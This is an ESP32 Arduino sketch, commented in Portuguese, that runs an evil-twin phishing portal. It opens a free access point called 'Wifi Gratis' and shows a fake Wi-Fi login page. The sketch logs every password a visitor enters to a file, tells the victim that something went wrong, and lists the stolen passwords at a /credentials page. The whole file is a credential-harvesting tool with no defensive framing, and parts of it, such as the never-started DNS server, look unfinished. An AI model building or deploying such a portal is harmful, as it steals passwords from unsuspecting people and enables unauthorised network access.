#include <Arduino.h>
#include "FS.h"
#include <LITTLEFS.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>
#include <time.h>

// Defina o SSID e a senha do ponto de acesso
const char *ssid = "Wifi Gratis";
const char *password = "";

// Crie instâncias para o servidor web e o DNSServer
AsyncWebServer server(80);
DNSServer dnsServer;

JsonDocument doc;

const byte DNS_PORT = 53;

// Página HTML de login
const char* configPage = {R"(
  <!DOCTYPE html>
  <html lang="pt-BR">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Conexão Wi-Fi</title>
      
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
      }

      body {
          font-family: Arial, sans-serif;
          background-color: #f0f0f0;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
      }

      .container {
          background-color: #fff;
          padding: 20px 30px;
          border-radius: 10px;
          box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
          text-align: center;
      }

      h1 {
          margin-bottom: 20px;
          font-size: 24px;
          color: #333;
      }

      form {
          display: flex;
          flex-direction: column;
          align-items: center;
      }

      label {
          margin-bottom: 10px;
          font-size: 18px;
          color: #555;
      }

      select, input[type="password"] {
          width: 100%;
          padding: 10px;
          margin-bottom: 20px;
          border: 1px solid #ccc;
          border-radius: 5px;
          font-size: 16px;
      }

      button {
          padding: 10px 20px;
          font-size: 16px;
          color: #fff;
          background-color: #007bff;
          border: none;
          border-radius: 5px;
          cursor: pointer;
          transition: background-color 0.3s ease;
      }

      button:hover {
          background-color: #0056b3;
      }

      </style>
  </head>
  <body>
      <div class="container">
          <h1>Conexão Wi-Fi</h1>
          <form id="wifi-form" method="post" action="/conectar">
              <label for="ssid">Nome da Rede Wi-Fi:</label>
              <select id="ssid" name="ssid">
                  <option value="rede1">Rede Wi-Fi 1</option>
                  <option value="rede2">Rede Wi-Fi 2</option>
                  <option value="rede3">Rede Wi-Fi 3</option>
                  <option value="rede4">Rede Wi-Fi 4</option>
              </select>

              <label for="password">Senha do Wi-Fi:</label>
              <input type="password" id="password" name="password" placeholder="Digite a senha">
              
              <button type="submit">Conectar</button>
          </form>
      </div>
  </body>
  </html>
)"};

const char* loginPage = {R"(
  <!DOCTYPE html>
  <html lang="pt-BR">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Conexão Wi-Fi</title>
      <style>
          * {
              margin: 0;
              padding: 0;
              box-sizing: border-box;
          }

          body {
              font-family: Arial, sans-serif;
              background-color: #f0f0f0;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
          }

          .container {
              background-color: #fff;
              padding: 20px 30px;
              border-radius: 10px;
              box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
              text-align: center;
          }

          h1 {
              margin-bottom: 20px;
              font-size: 24px;
              color: #333;
          }

          form {
              display: flex;
              flex-direction: column;
              align-items: center;
          }

          label {
              margin-bottom: 10px;
              font-size: 18px;
              color: #555;
          }

          input[type="text"] {
              width: 100%;
              padding: 10px;
              margin-bottom: 20px;
              border: 1px solid #ccc;
              border-radius: 5px;
              font-size: 16px;
          }

          button {
              padding: 10px 20px;
              font-size: 16px;
              color: #fff;
              background-color: #007bff;
              border: none;
              border-radius: 5px;
              cursor: pointer;
              transition: background-color 0.3s ease;
          }

          button:hover {
              background-color: #0056b3;
          }

      </style>
  </head>
  <body>

      <div class="container">
          <h1>Conexão Wi-Fi</h1>
          <form id="wifi-form" action="/save" method="POST">
              <label for="password">Senha do Wi-Fi:</label>
              <input type="text" id="password" name="password" placeholder="Digite a senha">
              <button type="submit">Conectar</button>
          </form>
      </div>

  </body>
  </html>

)"};

// Variáveis para armazenar dados de login
String inputPassword = "";


void setup() {
  Serial.begin(115200);
  if(!LittleFS.begin(FORMAT_LITTLEFS_IF_FAILED)){
	Serial.println("LittleFS Mount Failed");
	return;
	}

  // Configuração do ponto de acesso
	WiFi.softAP(ssid, password);
	Serial.println("Ponto de acesso iniciado");
	Serial.print("IP do ponto de acesso: ");
	Serial.println(WiFi.softAPIP());
  // Redireciona todas as solicitações para a página de login
  server.onNotFound([]( AsyncWebServerRequest *request ) { request->send(200, "text/html", loginPage); });

  // Lida com o envio do formulário de login
  server.on("/save", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("password", true)) {

      inputPassword = request->getParam("password", true)->value();

      // Verifique o login (aqui você pode adicionar a verificação real do usuário)
      if ( inputPassword != "" ) {

        Serial.println(WiFi.SSID() + ": " + inputPassword);

        File file = LittleFS.open("wifi_credentials.txt", FILE_APPEND);
        if (!file) {
          Serial.println("Failed to open file for writing");
          return;
        }
        file.println(inputPassword);
        file.close();

        request->send(200, "text/html", "<h1> Algo deu errado :( </h1>");

      } 
      else   request->send(200, "text/html", "Dados incompletos!");
    } 
    else  request->send(400, "text/html", "Bad Request");
  });

  // Configurando o servidor web para mostrar o conteúdo do arquivo salvo
  server.on("/credentials", HTTP_GET, [](AsyncWebServerRequest *request){
    String html = "<html><body><h1>Credenciais Salvas</h1>";
    File file = LittleFS.open("/wifi_credentials.txt", FILE_READ);
    if (file) {
      while (file.available()) {
        html += file.readStringUntil('\n') + "<br>";
      }
      file.close();
    } else {
      html += "Erro ao abrir o arquivo";
    }
    html += "</body></html>";
    request->send(200, "text/html", html);
  });

  server.on("/list", HTTP_GET, [](AsyncWebServerRequest *request){
    String json;
    deserializeJson(doc, json);
    request->send(200, "text/json", json);
  });

  // Inicia o servidor
  server.begin();
}

void loop() { dnsServer.processNextRequest(); }
